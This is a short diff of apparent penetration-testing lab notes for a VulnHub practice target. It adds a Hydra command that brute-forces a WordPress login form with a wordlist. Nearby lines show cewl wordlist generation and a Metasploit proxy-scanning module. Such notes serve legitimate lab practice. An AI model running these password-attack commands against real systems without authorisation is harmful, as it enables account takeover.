@@ -27,6 +27,7 @@ f
     - `drupalscan`(?)
 1. guess the password by crawling the web page content
   - `cewl http://192.168.56.223/bull -m 3 -w /root/tmp/pass.txt`  # minimal word len: -m 3
+  - `hydra -l <login_name> -P ~/tmp/vulnhub/pass.txt 192.168.56.223 -V http-form-post '/bull/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'`  # brute force attack
 1. if there is a proxy server run on the target, try to set browser's proxy pointing to the proxy server
     - use `auxiliary/scanner/http/squid_pivot_scanning` metasploit module for squid/proxy scan, ref: [SickOS 1.1](https://highon.coffee/blog/sickos-1-walkthrough/).
 1. it's possible that the server only allow certain user-agent to connect. Check it.
